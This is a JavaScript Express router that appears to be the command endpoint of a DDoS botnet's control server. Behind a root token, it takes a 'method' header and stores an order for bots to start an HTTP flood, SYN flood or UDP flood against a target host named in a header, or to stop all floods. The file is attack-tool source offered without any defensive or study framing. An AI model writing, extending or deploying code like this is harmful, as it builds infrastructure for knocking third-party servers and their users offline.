const { Router } = require('express');
const login = require('../utils/login');

module.exports = class SetCommand extends Router {
    constructor(server) {
        super(server);
        this.server = server;

        this.get('/setcommand', (req, res) => {
            login(this.server.config.rootToken, req, res);
            if (!req.headers.method) return res.json({
                message: 'Set the method in the headers',
                code: 400
            });
            if (req.headers.method === 'stop') {
                this.server.data.command.set('command', false, 'httpFlood');
                this.server.data.command.set('command', false, 'synFlood');
                this.server.data.command.set('command', false, 'udpFlood');
                res.json({
                    message: 'OK',
                    code: 200
                });
            };
            if (req.headers.method === 'httpFlood') {
                if (!req.headers.target) return res.json({
                    message: 'Set target host',
                    code: 401
                });
                    this.server.data.command.set('command', req.headers.target, 'httpFlood');
                res.json({
                    message: 'OK',
                    code: 200
                });
            };
            if (req.headers.method === 'synFlood') {
                if (!req.headers.target) return res.json({
                    message: 'Set target host',
                    code: 401
                });
                this.server.data.command.set('command', req.headers.target, 'synFlood');
                res.json({
                    message: 'OK',
                    code: 200
                });
            };
            if (req.headers.method === 'udpFlood') {
                if (!req.headers.target) return res.json({
                    message: 'Set target host',
                    code: 401
                });
                this.server.data.command.set('command', req.headers.target, 'udpFlood');
                res.json({
                    message: 'OK',
                    code: 200
                });
            };
        });
    };
};